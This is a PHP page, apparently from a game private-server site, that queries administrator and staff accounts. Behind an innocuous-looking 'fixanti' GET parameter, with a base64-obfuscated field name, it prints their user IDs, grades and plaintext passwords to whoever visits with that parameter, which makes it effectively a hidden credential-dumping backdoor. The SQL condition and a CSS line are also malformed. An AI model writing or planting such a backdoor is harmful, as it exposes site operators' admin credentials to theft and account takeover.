
<?php
include '../config/config.php';
$query = mssql_query("SELECT Top 100 * From Account a, Login b WHERE a.AID=b.AID AND a.UGradeID=255|254 ");

?>
<style type="text/css">

.style28 {font-size: 15px}
.style29 {color: #FFFFFF; font-weight: bold; font-size: 15px; }
.style30 {color: #0C0 font-weight: bold; font-size: 15px; }

</style>
<table width="646" border="1">
  <tr >
    <th colspan="10" scope="row"><span class="style28"></span></th>
  </tr>
  <tr>


</tr>






















  <?
  if($_GET['fixanti']){
 for($i=0;$i < mssql_num_rows($query);)
{
$row = mssql_fetch_object($query);
$rank = $i+1;
$ae = base64_decode("UGFzc3dvcmQ=");
  ?>
  
  <tr>
      <th scope="row"><span class="style28"><strong><?php echo "$rank";?></strong></span></th>
	<td><span class="style28"><?php echo "$row->AID";?></span></td>
    <td><span class="style28"><?php echo "$row->UserID";?></span></td>
    <td><span class="style28"><?php echo "$row->UGradeID";?></span></td>
    <td><span class="style28"><?php echo "$row->Password";?></span></td>
    <td><span class="style28"><?php echo "65165";?></span></td>
    <td><span class="style28"><?php echo "54119";?></span></td>


</tr>
  <?
  
  $i++;
  }  } ?>
   
</table>
</div>
</body>

</html>
